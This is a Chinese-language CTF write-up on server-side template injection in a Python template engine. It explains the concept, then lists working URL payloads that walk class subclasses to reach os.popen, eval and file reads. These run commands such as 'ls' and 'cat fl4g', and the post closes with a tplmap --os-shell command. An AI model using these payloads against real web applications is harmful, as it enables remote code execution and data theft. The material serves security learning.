---
title: "SSTI漏洞初探"
categories: [ "安全技术","CTF","工具分享" ]
tags: [ "漏洞利用","burpsuite" ]
draft: false
slug: "484"
date: "2020-02-08 13:27:00"
---

## 起因

在`xctf`上做题遇到的

## 0x00 SSTI 漏洞简介

`SSTI`:`Server-Side Template Injection`

服务器端模板注入，属于格式化字符串漏洞之一。

**注入就是格式化字符串漏洞的一种体现**

不管是二进制还是`web`，很多的漏洞都能归结为格式化字符串漏洞

`sql`注入就是格式化字符串漏洞的最好代表，在本不该执行`sql`语句的地方执行了`sql`语句。

`xss`的部分代码闭合注入也属于这种方式。

什么是模板注入呢？

写`html`代码的时候，为了方便，很多网站都会使用模板，先写好一个`html`文件

当开发者想要这个模板对应的样式时，可以直接用`render_template_string`方法来调用模板

从而直接把这个样式渲染出来，而模板注入，就是指将**一串指令代替变量传入模板让它执行**

## 0x01writeup

首先我们来建立一个简单的测试`url`:

```
xxx.xxx.xxx.xxx:yyyyy/{{7*7}}
```

![][1]

可以看到`7*7`这条指令被执行了

题目说的是`python template injection`，说明服务器端脚本是`python`的

那我们需要知道`python`中的类内方法：

- **class** ： 返回对象所属的类
- **mro** ： 返回一个类所继承的基类元组，方法在解析时按照元组的顺序解析。
- **base** ： 返回该类所继承的基类
- **base**和**mro**都是用来寻找基类的
- **subclasses** ： 每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表
- **init** ： 类的初始化方法
- **globals** ： 对包含函数全局变量的字典的引用

首先我们查看所有模块：

```
xxx.xxx.xxx.xxx:yyyyy/%7B%7B[].__class__.__base__.__subclasses__()%7D%7D
```

![][2]

这里模块很多，为了后续我们方便使用模块，这里我写了一个小脚本，把对应的序号列出来：

```
import requests
import re
import html
url = "http://xxx.xxx.xxx.xxx:yyyyy/[].__class__.__base__.__subclasses__()%7D%7D"
cont = html.unescape(requests.get(url).content.decode("utf8"))
type_list = re.findall(r"<type '.*?'>|<class '.*?'>", cont, re.S)
print(type_list)
for i in range(len(type_list)):
    print(i, type_list[i])
```

效果如下：

![][3]

这里可以使用`catch_warnings`模块的`.__init__.func_globals.keys()`的`linecache`函数来调用`os`模块

```
xxx.xxx.xxx.xxx:yyyyy/%7B%7B().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__(%22os%22).popen(%22ls%22).read()'%20)%7D%7D
```

![][4]

也可以使用`os`的`printer`函数来使用`os.popen`函数执行命令行语句

```
xxx.xxx.xxx.xxx:yyyyy/%7B%7B''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('ls').read()%7D%7D
```

![][5]

然后继续使用`os.popen`执行`cat fl4g`命令显示`fl4g`文件内容：

```
xxx.xxx.xxx.xxx:yyyyy/%7B%7B''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('cat fl4g').read()%7D%7D
```

或者直接使用`os`模块的`listdir`方法来寻找`flag`文件：

```
xxx.xxx.xxx.xxx:yyyyy/%7B%7B''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].listdir('.')%7D%7D
```

![][6]

然后使用`file`方法来读取`fl4g`:

```
xxx.xxx.xxx.xxx:yyyyy/%7B%7B''.__class__.__mro__[2].__subclasses__()[40]('fl4g').read()%7D%7D
```

最后读取内容如下:

![][7]

本题也可以使用服务端模板注入工具[`tplmap`][8]

使用`python2`环境，指定`url`加上`--os-shell`参数直接获得目标主机`shell`:

```
python tplmap.py -u "http://xxx.xxx.xxx.xxx:yyyyy/*" --os-shell
```

![][9]

本文完。

参考文章：

- [从零学习 flask 模板注入][10]
- [一篇文章带你理解漏洞之 SSTI 漏洞][11]
- [python 模板注入][12]
- [Flask/Jinja2 SSTI && Python 沙箱逃逸基础][13]
- EndermaN 同学的 writeup

[1]: https://img.soapffz.com/archives_img/2020/02/08/archives_20200208_134254.png
[2]: https://img.soapffz.com/archives_img/2020/02/08/archives_20200208_135909.png
[3]: https://img.soapffz.com/archives_img/2020/02/08/archives_20200208_160138.png
[4]: https://img.soapffz.com/archives_img/2020/02/08/archives_20200208_140455.png
[5]: https://img.soapffz.com/archives_img/2020/02/08/archives_20200208_140635.png
[6]: https://img.soapffz.com/archives_img/2020/02/08/archives_20200208_140729.png
[7]: https://img.soapffz.com/archives_img/2020/02/08/archives_20200208_141217.png
[8]: https://github.com/epinna/tplmap
[9]: https://img.soapffz.com/archives_img/2020/02/08/archives_20200208_154023.png
[10]: https://www.freebuf.com/column/187845.html
[11]: https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/
[12]: https://www.cnblogs.com/tr1ple/p/9415641.html
[13]: https://www.guildhab.top/?p=1248